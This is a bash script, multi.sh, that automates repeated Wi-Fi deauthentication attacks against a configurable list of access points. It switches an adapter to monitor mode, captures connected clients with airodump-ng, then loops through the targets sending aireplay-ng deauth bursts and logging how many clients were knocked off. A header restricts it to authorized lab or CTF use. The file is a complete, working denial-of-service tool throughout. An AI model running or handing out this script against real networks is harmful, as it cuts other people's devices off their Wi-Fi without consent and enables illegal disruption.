#!/bin/bash
# multi.sh — Multi-BSSID deauth script for authorized lab/CTF use.
# Customize the CONFIGURATION section below for your target network.
#
# ⚠ Authorized use only. Run only on networks you own or have written
#   permission to test. Deauthentication attacks on third-party networks
#   are illegal under the CFAA and equivalent laws.

set -euo pipefail
IFS=$'\n\t'

# ─── CONFIGURATION ──────────────────────────────────────────────────────────
INTERFACE="wlan0"           # your monitor-mode adapter (e.g. wlx..., wlan1)
ESSID="YOUR_NETWORK_NAME"   # SSID of the AP you own/have permission to test

DEAUTH_COUNT=3              # deauth frames per burst
SLEEP=5                     # seconds between attack cycles

# Map target BSSID → channel. Add/remove entries as needed.
declare -A BSSID_CHAN=(
  ["AA:BB:CC:DD:EE:F1"]="6"
  ["AA:BB:CC:DD:EE:F2"]="1"
  ["AA:BB:CC:DD:EE:F3"]="6"
  ["AA:BB:CC:DD:EE:F4"]="1"
)

CAPTURE_FILE="/tmp/deauth_capture"
# ────────────────────────────────────────────────────────────────────────────

CLEANED_UP=false
NEEDS_RESTORE=false

require_cmd() {
  local cmd="$1"
  if ! command -v "$cmd" >/dev/null 2>&1; then
    echo "Missing required command: $cmd" >&2
    exit 1
  fi
}

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

for dep in sudo ip iw airmon-ng airodump-ng aireplay-ng awk grep; do
  require_cmd "$dep"
done

if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
  echo -e "${RED}[-] Interface '$INTERFACE' not found${NC}"
  echo -e "${YELLOW}    Set INTERFACE= in the CONFIGURATION section above.${NC}"
  exit 1
fi

# Cleanup function
cleanup() {
  if [ "$CLEANED_UP" = true ]; then
    return
  fi
  CLEANED_UP=true

  if [ "$NEEDS_RESTORE" = false ]; then
    return
  fi

  echo -e "\n${YELLOW}[!] Stopping processes...${NC}"
  sudo pkill -f airodump-ng >/dev/null 2>&1 || true
  sudo pkill -f aireplay-ng >/dev/null 2>&1 || true
  
  sudo iw dev "$INTERFACE" set type managed >/dev/null 2>&1 || true
  sudo ip link set "$INTERFACE" up >/dev/null 2>&1 || true
  
  # Remove capture files (ignore errors)
  rm -f "${CAPTURE_FILE}-01."* 2>/dev/null
  
  # Restart NetworkManager so your main Wi-Fi works again
  echo -e "${GREEN}[+] Restarting NetworkManager...${NC}"
  sudo systemctl restart NetworkManager >/dev/null 2>&1 || true
}

trap 'cleanup; exit 0' INT TERM
trap cleanup EXIT

echo -e "${GREEN}[+] Setting up monitor mode on $INTERFACE${NC}"

# Kill interfering processes
NEEDS_RESTORE=true
sudo airmon-ng check kill >/dev/null 2>&1

# Force monitor mode
sudo ip link set "$INTERFACE" down
sudo iw dev "$INTERFACE" set type monitor
sudo ip link set "$INTERFACE" up
sudo iw dev "$INTERFACE" set channel 1

# Verify
if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
  echo -e "${RED}[-] Failed to set monitor mode${NC}"
  exit 1
fi

# Get channels
CHANNELS=$(printf "%s\n" "${BSSID_CHAN[@]}" | sort -u | tr '\n' ',' | sed 's/,$//')
if [ -z "$CHANNELS" ]; then
  echo -e "${RED}[-] No channels configured for target BSSIDs${NC}"
  exit 1
fi

# Start airodump-ng WITHOUT --essid (more reliable client capture)
echo -e "${PURPLE}[+] Starting full capture on channels: $CHANNELS${NC}"
sudo airodump-ng \
  --channel "$CHANNELS" \
  --output-format csv \
  --write "$CAPTURE_FILE" \
  "$INTERFACE" >/dev/null 2>&1 &
AIRODUMP_PID=$!

# Wait for CSV
echo -e "${YELLOW}[+] Waiting for capture file...${NC}"
for i in {1..10}; do
  if [ -f "${CAPTURE_FILE}-01.csv" ]; then
    break
  fi
  sleep 1
done

if [ ! -f "${CAPTURE_FILE}-01.csv" ]; then
  echo -e "${RED}[-] Capture file not created${NC}"
  cleanup
  exit 1
fi

# Wait for client data
echo -e "${YELLOW}[+] Waiting for client data (up to 20 sec). Connect a device to '$ESSID' now!${NC}"
for i in {1..20}; do
  # Check if any client is associated with any target BSSID
  if grep -i -F -- "$ESSID" "${CAPTURE_FILE}-01.csv" >/dev/null 2>&1; then
    # Check if there's a client MAC in the station section (after blank line)
    if awk 'BEGIN{f=0} /^$/ {f=1} f && /..:..:..:..:..:../ && !/BSSID/ {exit 0} END{exit 1}' "${CAPTURE_FILE}-01.csv"; then
      echo -e "${GREEN}[+] Client detected! Starting attack.${NC}"
      break
    fi
  fi
  sleep 1
  if [ $i -eq 20 ]; then
    echo -e "${RED}[-] No clients found. Ensure a device is connected and active on '$ESSID'.${NC}"
    cleanup
    exit 1
  fi
done

# Function: get clients for a BSSID
get_clients() {
  local bssid="$1"
  if [ -f "${CAPTURE_FILE}-01.csv" ]; then
    # Extract station section (after blank line)
    awk -v bssid="$bssid" '
      BEGIN { in_stations = 0; IGNORECASE = 1 }
      /^$/ { in_stations = 1; next }
      in_stations && NF >= 6 {
        gsub(/ /, "", $1);  # BSSID
        gsub(/ /, "", $6);  # Station MAC
        if (tolower($1) == tolower(bssid) && $6 != "" && length($6) == 17) {
          print tolower($6)
        }
      }
    ' "${CAPTURE_FILE}-01.csv" | sort -u
  fi
}

echo "--------------------------------------------------"

# Main loop
while true; do
  for bssid in "${!BSSID_CHAN[@]}"; do
    chan="${BSSID_CHAN[$bssid]}"
    
    # Switch channel
    sudo iw dev "$INTERFACE" set channel "$chan" >/dev/null 2>&1
    sleep 0.3

    clients_before=$(get_clients "$bssid")
    count_before=$(printf '%s\n' "$clients_before" | grep -c . || true)

    if [ "$count_before" -eq 0 ]; then
      echo -e "[${BLUE}$(date +'%H:%M:%S')${NC}] ${YELLOW}→ ${bssid} (Ch${chan}): No clients${NC}"
      continue
    fi

    echo -e "[${BLUE}$(date +'%H:%M:%S')${NC}] ${GREEN}→ ${bssid} (Ch${chan}): ${count_before} client(s)${NC}"
    
    # Deauth
    sudo aireplay-ng --deauth "$DEAUTH_COUNT" -a "$bssid" "$INTERFACE" >/dev/null 2>&1
    sleep 2

    # Check after
    clients_after=$(get_clients "$bssid")
    count_after=$(printf '%s\n' "$clients_after" | grep -c . || true)

    if [ "$count_after" -lt "$count_before" ]; then
      echo -e "    ${GREEN}✅ SUCCESS: Lost $((count_before - count_after)) client(s)!${NC}"
    else
      echo -e "    ${RED}❌ Still connected${NC}"
    fi
  done

  echo -e "[${BLUE}$(date +'%H:%M:%S')${NC}] ${PURPLE} Sleeping ${SLEEP}s...${NC}"
  sleep "$SLEEP"
done
